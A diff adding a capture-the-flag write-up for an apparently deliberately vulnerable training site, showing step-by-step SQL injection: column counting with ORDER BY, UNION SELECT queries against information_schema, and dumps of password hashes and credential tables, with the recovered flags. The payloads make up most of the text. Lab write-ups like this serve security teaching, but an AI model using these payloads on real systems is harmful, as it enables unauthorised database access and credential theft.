@@ -1,0 +1,38 @@
+first of all we test that the site is vulnerable to sql injuctions by typing a single quote in the input
+
+assuming the server already has a select statement in place, if we want to injuct our own select statement, we need to use UNION. 
+using UNION to execute two select statements means they both must have the same number of columns, 
+this confirms that the number of columns is 2 : -1 order by 2 --
+
+now lets injuct this statement to get the names of tables and table schemas to which each table belongs:
+-1 AND false union SELECT table_name , table_schema  FROM information_schema.columns 
+
+now lets display the column names of each table
+-1 AND false union SELECT column_name , table_schema  FROM information_schema.columns 
+
+knowing the names of of colums we want to display and the name of the table, and table schema they belong to, we can use this statement
+
+for  Member_Sql_Injection/users :
+-1 UNION ALL SELECT countersign, Commentaire FROM Member_Sql_Injection.users; 
+decrypting 5ff9d0165b4f92b14994e5c685cdce28 gives us this:
+
+--> FLAG: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+for  Member_images/list_images :
+-1 UNION ALL SELECT url, comment FROM Member_images.list_images;  
+decrypting 1928e8083cf461a51303633093573c46 gives us this:
+
+--> FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+for  Member_Brute_Force/db_default
+-1 UNION ALL SELECT  username , password FROM Member_Brute_Force. db_default
+
+list usernames and passwords from table_schema/table_name
+-1 UNION ALL SELECT  username , password FROM Member_Brute_Force. db_default 
+
+--> FLAG: B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
+
+
+
+
+
